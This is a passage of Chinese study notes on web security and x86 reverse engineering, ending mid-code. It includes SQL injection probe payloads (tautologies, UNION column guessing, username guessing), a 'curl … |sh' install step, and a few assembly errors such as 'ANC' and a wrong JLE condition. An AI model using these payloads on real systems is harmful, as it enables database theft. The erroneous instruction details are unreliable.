<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>samesite=strict</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>samesite=lax</span><br></pre></td></tr></table></figure>
<p>但该方法只有Chrome和苹果浏览器支持。</p>
<p>使用验证码和Token：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证码</span></span><br><span class="line"><span class="keyword">var</span> captcha = <span class="title function_">ccap</span>(); <span class="comment">// 调用外部模块生成验证码</span></span><br><span class="line"><span class="keyword">var</span> data = captcha.<span class="title function_">get</span>(); <span class="comment">// 0 - 图片  1 - 文字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Token</span></span><br><span class="line"><span class="comment">// 后端生成Token，表单或Meta中一份，Cookie中一份。</span></span><br><span class="line"><span class="comment">// 后端收到提交后，判断表单和Cookie中Token是否一致。</span></span><br><span class="line"><span class="comment">// 攻击者没有表单中的Token，也拿不到Cookie中的Token。</span></span><br></pre></td></tr></table></figure>

<p>验证Referer：Referer是HTTP请求头中的部分，可以通过验证该字段是否是A网站来判断请求的合法性。<br>但是有时一些浏览器没有Referer，因此这种验证是否需要要看需求。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这种验证方法仍然有局限性，可以使用正则表达式</span></span><br><span class="line"><span class="keyword">var</span> referer = ctx.<span class="property">request</span>.<span class="property">headers</span>.<span class="property">referer</span>;</span><br><span class="line"><span class="keyword">if</span>(referer.<span class="title function_">indexOf</span>(<span class="string">&#x27;localhost&#x27;</span>) === -<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Error&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>特点：</p>
<ul>
<li>存储在前端</li>
<li>后端可以通过设置HTTP头，设置Cookie</li>
<li>请求时，通过HTTP头，交给后端</li>
<li>前端也可以读写</li>
<li>遵守同源策略：协议，域名，端口必须一致。</li>
<li>有有效期</li>
<li>可以用路径(Path)分类</li>
<li>HTTP-ONLY</li>
<li>HTTPS-ONLY (Security)</li>
</ul>
<p>操作：</p>
<ul>
<li>删除：通过设置有效期为过去的时间<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toGMTString</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;name=1; expires=&#x27;</span> + now;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>使用：</p>
<ul>
<li>为了防止被篡改，登录凭证使用：用户ID + 签名</li>
<li>也可以用加密</li>
<li>设置HTTP-ONLY &#x2F; HTTPS-ONLY &#x2F; same-site</li>
<li>SessionID 一般存放到数据库中</li>
</ul>
<p>与网络攻击：</p>
<ul>
<li>XSS可能偷取Cookie</li>
<li>CSRF利用Cookie，但是无法读写Cookie</li>
</ul>
<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>通过设置一个透明的IFrame，用另外的页面诱骗用户点击一系列位置（目标网站的一系列按钮）。</p>
<p>防御：防止网站被内嵌。</p>
<ul>
<li>使用判断条件：（但是可以被sandbox属性屏蔽）<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top !== <span class="variable language_">window</span></span><br><span class="line">top.<span class="property">location</span> != <span class="variable language_">window</span>.<span class="property">location</span></span><br></pre></td></tr></table></figure></li>
<li>可以设置头部：X-FRAME-OPTIONS<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">set</span>(<span class="string">&#x27;X-Frame-Options&#x27;</span>, <span class="string">&#x27;DENY&#x27;</span>); </span><br><span class="line"><span class="comment">// SAME-ORIGIN / ALLOW-FROM / DENY</span></span><br></pre></td></tr></table></figure></li>
<li>设置验证码</li>
</ul>
<h2 id="HTTP-传输窃听"><a href="#HTTP-传输窃听" class="headerlink" title="HTTP 传输窃听"></a>HTTP 传输窃听</h2><p>使用AnyProxy作为HTTP代理。<br>攻击:</p>
<ul>
<li>中间人通过替换常用脚本，插入攻击代码。 </li>
<li>查看传输的数据</li>
<li>插入广告</li>
<li>重定向网站</li>
<li>无法防御XSS, CRSF</li>
</ul>
<p>防御:</p>
<ul>
<li>使用HTTPS (TLS)</li>
<li>防止中间人攻击, 使用证书机制 CA<ul>
<li>浏览器内置信任列表 </li>
<li>服务器申请证书</li>
<li>CA 颁发证书</li>
<li>浏览器发起请求, 得到证书, 验证通过</li>
</ul>
</li>
<li>证书攻击: 证书无法伪造, 私钥不泄露(存在服务器上), 域名管理权不丢失, CA不出错</li>
<li>Windows 上查看证书 <code>Win+R</code>, <code>mmc</code></li>
</ul>
<p>为网站添加证书:</p>
<ol>
<li>安装脚本<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://get.acme.sh |sh</span><br><span class="line"><span class="built_in">cd</span> /root/.acme.sh</span><br><span class="line">./acme.sh  --issue -d mydomain.com -d www.mydomain.com --webroot /home/wwwroot/html/</span><br></pre></td></tr></table></figure></li>
<li>得到证书, 私钥等。<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/root/.acme.sh/.../name.cer         <span class="comment"># 证书</span></span><br><span class="line">/root/.acme.sh/.../name.key         <span class="comment"># 私钥</span></span><br><span class="line">/root/.acme.sh/.../ca.cer           <span class="comment"># CA 证书</span></span><br><span class="line">/root/.acme.sh/.../fullchain.cer    <span class="comment"># 合并证书</span></span><br></pre></td></tr></table></figure></li>
<li>配置Nginx<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>          <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span>          <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span>     www.mydomain.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /root/.acme.sh/.../fullchain.cer;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /root/.acme.sh/.../name.key;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /home/wwwroot/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>重启Nginx</li>
</ol>
<h2 id="密码安全"><a href="#密码安全" class="headerlink" title="密码安全"></a>密码安全</h2><p>泄露途径：</p>
<ul>
<li>数据库被盗</li>
<li>服务器被入侵</li>
<li>通信链路被窃听</li>
<li>内部人员泄露</li>
<li>撞库（社工）</li>
</ul>
<p>存储：</p>
<ul>
<li>加密存储</li>
<li>单向变化</li>
<li>增强变化复杂度</li>
<li>增强密码复杂度</li>
<li>加盐</li>
</ul>
<h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><p>明文与密文一一对应。<br>雪崩效应：原文一点点不一样，密文完全不一样。<br>单向变化。<br>密文长度固定。</p>
<p>MD5 SHA1 SHA256：破解方法，彩虹表。最大支持破解8位数字加字母。<br>变换次数越多越安全，彩虹表失效，解密成本增大。</p>
<h3 id="传输过程防范"><a href="#传输过程防范" class="headerlink" title="传输过程防范"></a>传输过程防范</h3><p>使用HTTPS传输。<br>加入密码尝试次数限制。<br>前端加密，但是意义有限，仅防止明文泄露。</p>
<h3 id="生物特征密码"><a href="#生物特征密码" class="headerlink" title="生物特征密码"></a>生物特征密码</h3><p>私密性：容易泄露（照片，接触等）<br>安全性：碰撞<br>唯一性：无法修改</p>
<h2 id="关系型数据库注入"><a href="#关系型数据库注入" class="headerlink" title="关系型数据库注入"></a>关系型数据库注入</h2><p>常见数据库：</p>
<ul>
<li>Access：早期用，单文件</li>
<li>Sqlite：嵌入式设备，单文件，并发弱</li>
<li>Mysql：作为服务，支持大量数据和并发</li>
<li>Mssql Server：作为服务，收费</li>
</ul>
<h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>数据部分被插入了程序。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>常用注入条件：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">0</span>  # 如果报错，则表示注入成功</span><br><span class="line"><span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>   </span><br><span class="line"><span class="keyword">and</span> mid(version(), <span class="number">1</span>, <span class="number">1</span>) <span class="operator">=</span> <span class="number">5</span> # 判断是否是Mysql，以及版本号</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">table</span>;     # 每列都是<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> id,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">table</span>;  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> table2; # 猜测表有多少字段</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> mid(username, <span class="number">1</span>, <span class="number">1</span>) <span class="operator">=</span> &quot;t&quot;; # 猜用户名</span><br></pre></td></tr></table></figure>
<p>SQL注入中，如果页面报错，则SQL查询失败。</p>
<p>危害：</p>
<ul>
<li>猜解密码</li>
<li>获取数据</li>
<li>删库删表</li>
<li>拖库</li>
</ul>
<p>防御：</p>
<ul>
<li>关闭错误输出</li>
<li>检查数据类型</li>
<li>对数据进行转义，例如引号，等号等。</li>
<li>使用参数化查询（分解为两次传输）</li>
<li>使用ORM</li>
</ul>
<h2 id="上传问题"><a href="#上传问题" class="headerlink" title="上传问题"></a>上传问题</h2><p>上传文件，再被解析为程序。多发生在PHP中。</p>
<p>防御：</p>
<ul>
<li>过滤非法后缀文件：容易伪造</li>
<li>文件类型(Type)检查：由浏览器提供类型，也可以伪造</li>
<li>文件内容检查：无法拦截混合文件</li>
<li>使用程序输出：通过程序读取文件，再输出给用户。性能受影响</li>
<li>权限控制：可写可执行的目录互斥</li>
<li>使用路由机制</li>
</ul>
<h2 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h2><p>信息内容</p>
<ul>
<li>系统敏感信息</li>
<li>用户敏感信息</li>
<li>用户密码</li>
</ul>
<p>泄露途径</p>
<ul>
<li>错误信息失控</li>
<li>SQL注入</li>
<li>权限控制不当</li>
<li>XSS &#x2F; CSRF</li>
</ul>
<p>OAuth 思想：<br>第三方平台借用QQ等平台的用户凭证。<br>一切用户由用户授权。<br>第三方平台只能拿到Token，其他信息拿不到。</p>
<h1 id="Windows-逆向"><a href="#Windows-逆向" class="headerlink" title="Windows 逆向"></a>Windows 逆向</h1><h2 id="OD-1"><a href="#OD-1" class="headerlink" title="OD"></a>OD</h2><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>打开程序：F3<br>执行单步语句：F8<br>断点：F2</p>
<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>CmdBar</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db 0x12FFDC  <span class="comment"># d 表示查看数据  b 表示 byte</span></span><br><span class="line"><span class="comment"># 还可以是 dw dd</span></span><br></pre></td></tr></table></figure>

<h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>32位寄存器：<br>EAX 累加器<br>EBX DS段数据指针<br>ECX 计数<br>EDX IO指针<br>ESI 字符串操作源指针 SS段指针<br>ESP 堆栈指针<br>EBP SS段指针<br>EDI 字符串目标指针 ES段指针</p>
<p>16位寄存器：<br>AX, CX, DX, BX, SP, BP, SI, DI<br>0 , 1 , 2 , 3 , 4 , 5 , 6 , 7</p>
<p>8位寄存器：<br>AL, CL, DL, BL, AH, CH, DH, BH<br>0 , 1 , 2 , 3 , 4 , 5 , 6 , 7</p>
<p>如果是64位程序，则所有的寄存器中的E换成R。例如：<br>EAX变为RAX；ESP变为RSP。<br>另外QWORD表示4字64位。</p>
<h3 id="MOV-类"><a href="#MOV-类" class="headerlink" title="MOV 类"></a>MOV 类</h3><p>MOV</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> 目标操作数, 源操作数</span><br><span class="line"><span class="keyword">MOV</span> 通用寄存器/段寄存器/内存, 通用寄存器/段寄存器/内存/立即数</span><br></pre></td></tr></table></figure>
<p>源操作数和目标操作数不能同时是内存。<br>源操作数和目标操作数必须等宽。</p>
<p>MOVS<br>允许两边同时为内存。但是执行后，结果依据DF位判断增减的方向。DF为1时，减偏移量。一般用于字符串复制。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOVS <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[ebi], <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</span><br></pre></td></tr></table></figure>

<p>MOVSX<br>先符号扩展，再复制变量。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVSX</span> <span class="built_in">cx</span>, <span class="built_in">al</span></span><br></pre></td></tr></table></figure>

<p>MOVZX<br>先零扩展，再复制变量。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVZX</span> <span class="built_in">cx</span>, <span class="built_in">al</span></span><br></pre></td></tr></table></figure>

<h3 id="ADD-SUB"><a href="#ADD-SUB" class="headerlink" title="ADD &#x2F; SUB"></a>ADD &#x2F; SUB</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD</span> 目标操作数, 源操作数</span><br><span class="line"><span class="keyword">SUB</span> 目标操作数, 源操作数</span><br></pre></td></tr></table></figure>
<p>源操作数和目标操作数不能同时是内存。<br>结果存入目标操作数的位置。</p>
<h3 id="AND-OR-XOR-NOT"><a href="#AND-OR-XOR-NOT" class="headerlink" title="AND &#x2F; OR &#x2F; XOR &#x2F; NOT"></a>AND &#x2F; OR &#x2F; XOR &#x2F; NOT</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> 目标操作数, 源操作数</span><br><span class="line"><span class="keyword">OR</span>  目标操作数, 源操作数</span><br><span class="line"><span class="keyword">XOR</span> 目标操作数, 源操作数</span><br><span class="line"><span class="keyword">NOT</span> 目标操作数</span><br></pre></td></tr></table></figure>
<p>源操作数和目标操作数不能同时是内存。<br>结果存入目标操作数的位置。</p>
<h3 id="ADC-SBB"><a href="#ADC-SBB" class="headerlink" title="ADC &#x2F; SBB"></a>ADC &#x2F; SBB</h3><p>通过标志寄存器的进位位计算结果。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ANC 目标操作数, 源操作数 <span class="comment">; 考虑进位的加法</span></span><br><span class="line"><span class="keyword">SBB</span> 目标操作数, 源操作数 <span class="comment">; 考虑进位的减法</span></span><br></pre></td></tr></table></figure>

<h3 id="CMP-TEST"><a href="#CMP-TEST" class="headerlink" title="CMP &#x2F; TEST"></a>CMP &#x2F; TEST</h3><p>CMP功能和SUB一样，TEST功能和AND一样，但都只修改标志寄存器的值。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CMP</span>  目标操作数, 源操作数 </span><br><span class="line"><span class="keyword">TEST</span> 目标操作数, 源操作数 </span><br></pre></td></tr></table></figure>
<p>CMP判断结果：<br>Z&#x3D;1：相等。<br>S&#x3D;1：目标操作数小于源操作数。<br>TEST判断结果：<br><code>TEST eax, eax</code> Z&#x3D;1：EAX为零。</p>
<h3 id="JCC-类"><a href="#JCC-类" class="headerlink" title="JCC 类"></a>JCC 类</h3><p>JMP：直接修改EIP。不会修改其他寄存器。<br>CALL：会影响堆栈和寄存器。CALL的下一个语句（返回地址）会入栈（ESP）。跳转之后会自动执行，因此需要先加入断点再跳转。<br>RETN：会返回返回地址，会弹栈。相当于POP EIP。如果是<code>RET 8</code>则还会执行<code>ESP+8</code>（内平栈）。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">JE</span> <span class="keyword">JZ</span> 目标操作数       <span class="comment">; ZF=1 相等跳转</span></span><br><span class="line"><span class="keyword">JNE</span> <span class="keyword">JNZ</span> 目标操作数     <span class="comment">; ZF=0 不相等跳转</span></span><br><span class="line"><span class="keyword">JS</span>  目标操作数         <span class="comment">; SF=1 负则跳转</span></span><br><span class="line"><span class="keyword">JNS</span> 目标操作数         <span class="comment">; SF=0 正或0则跳转</span></span><br><span class="line"><span class="keyword">JO</span>  目标操作数         <span class="comment">; OF=1 溢出跳转</span></span><br><span class="line"><span class="keyword">JNO</span> 目标操作数         <span class="comment">; OF=0 不溢出跳转</span></span><br><span class="line"><span class="comment">; 无符号</span></span><br><span class="line"><span class="keyword">JC</span> <span class="keyword">JB</span> <span class="keyword">JNAE</span> 目标操作数  <span class="comment">; CF=1 进位跳转，小于跳转</span></span><br><span class="line"><span class="keyword">JNC</span> <span class="keyword">JNB</span> <span class="keyword">JAE</span> 目标操作数 <span class="comment">; CF=0 无进位跳转，大于等于跳转</span></span><br><span class="line"><span class="keyword">JBE</span> <span class="keyword">JNA</span> 目标操作数     <span class="comment">; ZF=1 或 CF=1 小于等于跳转 </span></span><br><span class="line"><span class="keyword">JNBE</span> <span class="keyword">JA</span> 目标操作数     <span class="comment">; ZF=0 或 CF=0 大于则跳转</span></span><br><span class="line"><span class="comment">; 有符号</span></span><br><span class="line"><span class="keyword">JL</span> <span class="keyword">JNGE</span> 目标操作数     <span class="comment">; SF!=OF 小于则跳转</span></span><br><span class="line"><span class="keyword">JNL</span> <span class="keyword">JGE</span> 目标操作数     <span class="comment">; SF==OF 大于等于则跳转</span></span><br><span class="line"><span class="keyword">JLE</span> <span class="keyword">JNG</span> 目标操作数     <span class="comment">; ZF!=OF 或 ZF=1 小于等于则跳转</span></span><br><span class="line"><span class="keyword">JNLE</span> <span class="keyword">JG</span> 目标操作数     <span class="comment">; SF==OF 且 ZF=0 大于则跳转</span></span><br></pre></td></tr></table></figure>

<h3 id="SET-类"><a href="#SET-类" class="headerlink" title="SET 类"></a>SET 类</h3><p>通过判断条件来设置为1。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SETE</span> <span class="built_in">eax</span>  <span class="comment">; 如果相等，则设置为1</span></span><br></pre></td></tr></table></figure>

<h3 id="XCHG"><a href="#XCHG" class="headerlink" title="XCHG"></a>XCHG</h3><p>交换</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">XCHG</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</span><br></pre></td></tr></table></figure>

<h3 id="STOS"><a href="#STOS" class="headerlink" title="STOS"></a>STOS</h3><p>将EAX AX AL的值存放到EDI指定的位置。同样增减方向受到DF标志影响。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">STOS <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br></pre></td></tr></table></figure>

<h3 id="REP"><a href="#REP" class="headerlink" title="REP"></a>REP</h3><p>依据ECX指定重复次数。可以与STOS，MOVS一起用。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REP</span> MOVS <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[ebi], <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</span><br></pre></td></tr></table></figure>

<h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p>算术移位：左移，最低位补0，最高位移入CF。右移，最低位移入CF，最高位不变。<br>有符号数右移。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SAL</span>/<span class="keyword">SAR</span> 目标操作数, 移位次数</span><br></pre></td></tr></table></figure>

<p>逻辑移位：左移，最低位补0，最高位移入CF。右移，最低位移入CF，最改为补0。<br>无符号数右移。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHL</span>/<span class="keyword">SHR</span> 目标操作数, 移位次数</span><br></pre></td></tr></table></figure>

<p>循环移位：溢出位同时进入CF。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ROL</span>/<span class="keyword">ROR</span> 目标操作数, 移位次数</span><br></pre></td></tr></table></figure>

<p>带进位的循环移位：左移，最高位移入CF，CF移入最低为。右移，最低位移入CF，CF移入最高位。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RCL</span>/<span class="keyword">RCR</span> 目标操作数, 移位次数</span><br></pre></td></tr></table></figure>

<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>BYTE  8 bits<br>WORD  16 bits<br>DWORD 32 bits<br>内存单元宽度 8 bits</p>
<p>以32位计算机为例：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV</span> [<span class="number">0x12345678</span>], <span class="number">0xFFFF</span>  <span class="comment">;不推荐</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x12345678</span>], <span class="number">0xFFFF</span></span><br><span class="line"><span class="comment">; MOV 数据宽度 地址（指针） 段寄存器：[地址编号], 0xFFFF</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>每个程序都有一个独立的程序空间。以32位程序为例，程序独有一个4GB的程序空间。但是大多数空间不允许访问。</p>
<p>内存寻址方式：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 立即数</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x123456</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x123456</span>], <span class="built_in">eax</span>  <span class="comment">; 写</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x123456</span>]  <span class="comment">; 获取内存地址</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esp</span> + <span class="number">8</span>]   <span class="comment">; 获取内存地址</span></span><br><span class="line"><span class="comment">; 寄存器寻址</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span> + <span class="number">1</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span> + <span class="built_in">ecx</span> * <span class="number">2</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span> + <span class="built_in">ecx</span> * <span class="number">2</span> + <span class="number">3</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>], <span class="built_in">eax</span>  <span class="comment">; 写</span></span><br></pre></td></tr></table></figure>

<h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>在Windows中，栈由高地址向低地址生长。增加元素时，栈顶指针减小。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 创建栈顶栈底</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ebx</span>, <span class="number">0x12FFE0</span>   <span class="comment">; 栈底</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, <span class="number">0x12FFE0</span>   <span class="comment">; 栈顶</span></span><br><span class="line"><span class="comment">; 存放</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span> - <span class="number">4</span>], <span class="number">0xAAAAAAAA</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">edx</span>, <span class="number">4</span></span><br><span class="line"><span class="comment">;     或</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span> - <span class="number">4</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span 